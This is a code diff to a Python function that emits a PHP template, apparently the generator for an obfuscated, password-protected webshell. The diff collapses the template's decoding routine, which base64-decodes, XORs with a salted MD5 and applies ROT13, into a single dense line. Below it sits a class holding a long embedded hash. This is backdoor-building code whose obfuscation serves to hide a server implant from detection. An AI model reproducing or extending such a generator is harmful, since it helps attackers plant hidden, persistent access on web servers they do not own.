@@ -1,15 +1,6 @@
 def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
     return """<?php
-function dept($data,$salt="%s",$change=0x80){
-    $data=base64_decode($data);
-    $that="";
-    $saltm = md5($salt);
-    for($i=0;$i<strlen($data);$i++){
-            $that.=chr((ord($data[$i])^ord($saltm[$i%%32]))^$change);
-        }
-    $pass=strrev(str_rot13(substr(strrev($that),0,-32)));
-    return $pass;
-}
+function dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}
 
 class User{
     private $hash = 'cb4d4a2d4a4d8f2f4a2dc8494c4ead71f7f17772f409aec94d2daa8977770da9890ff00f0692cefefede9eae352a0589c5c5b62af1c1ae4161ae41d100';
